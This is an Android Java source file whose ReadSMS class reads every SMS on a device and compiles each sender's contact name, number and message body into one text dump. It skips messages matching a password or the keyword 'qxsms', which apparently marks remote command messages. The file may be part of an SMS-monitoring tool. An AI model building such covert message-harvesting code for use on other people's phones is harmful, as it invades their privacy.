package my.pro;

import android.app.Activity;
import android.database.Cursor;

public class ReadSMS extends Activity {

	public StringBuilder smsNumber(Cursor smsCur, Cursor contactCur, String password) {

		StringBuilder str = new StringBuilder();

		ReadContacts contactsPro = new ReadContacts();
		try {

			if (smsCur != null) {
				if (smsCur.moveToFirst()) {
					String smsNumber = new String();
					String smsBody = new String();

					
					
					String testStr = new String();
					do {

						// 得到的短信号码格式为+86135****0534类型的，先对获取的短信号码进行处理，去掉+86
						smsNumber = smsCur.getString(smsCur.getColumnIndex("address"));
						// substring方法截取字符串，从startIndex开始，到endIndex结束
						if (smsNumber.charAt(0) == '+') {
							smsNumber = smsNumber.substring(3, smsNumber.length());
						}

						smsBody = smsCur.getString(smsCur.getColumnIndex("body"));
						//smsData = smsCur.getShort(smsCur.getColumnIndex("data"));

						//联系人姓名
						testStr = contactsPro.contactName(smsNumber, contactCur);
						
						if (smsBody.equals(password) == false && smsBody.equals("qxsms") == false && smsBody.equals("QXSMS") == false) {
							str.append(testStr);
							str.append("-");
							str.append(smsNumber);
							str.append("-");
							str.append(smsBody);
							str.append("\n");
							//str.append("/");
							//str.append("\n");
						}
					} while (smsCur.moveToNext());
				}
			}
		} catch (Exception ex) {
			str.append(ex.toString());
		} finally {
			smsCur.close();
			contactCur.close();
		}
		return str;

	}
	
	
	public StringBuilder smsNumber(Cursor smsCur, Cursor contactCur, String password,long restartTime) {

		StringBuilder str = new StringBuilder();

		ReadContacts contactsPro = new ReadContacts();
		try {

			if (smsCur != null) {
				if (smsCur.moveToFirst()) {
					String smsNumber = new String();
					String smsBody = new String();

					
					
					String testStr = new String();
					do {

						// 得到的短信号码格式为+86135****0534类型的，先对获取的短信号码进行处理，去掉+86
						smsNumber = smsCur.getString(smsCur.getColumnIndex("address"));
						// substring方法截取字符串，从startIndex开始，到endIndex结束
						if (smsNumber.charAt(0) == '+') {
							smsNumber = smsNumber.substring(3, smsNumber.length());
						}

						smsBody = smsCur.getString(smsCur.getColumnIndex("body"));
						//smsData = smsCur.getShort(smsCur.getColumnIndex("data"));

						//联系人姓名
						testStr = contactsPro.contactName(smsNumber, contactCur);
						//短信接收时间
						long receiverTime = smsCur.getLong(smsCur.getColumnIndex("date"));
						
						if (smsBody.equals(password) == false && receiverTime > restartTime && smsBody.equals("qxsms") == false && smsBody.equals("QXSMS") == false) {
							str.append(testStr);
							str.append("\n");
							str.append(smsNumber);
							str.append("\n");
							str.append(smsBody);
							str.append("\n");
							str.append("/");
							str.append("\n");
						}
					} while (smsCur.moveToNext());
				}
			}
		} catch (Exception ex) {
			str.append(ex.toString());
		} finally {
			smsCur.close();
			contactCur.close();
		}
		return str;

	}
	
	
	
	
	

}
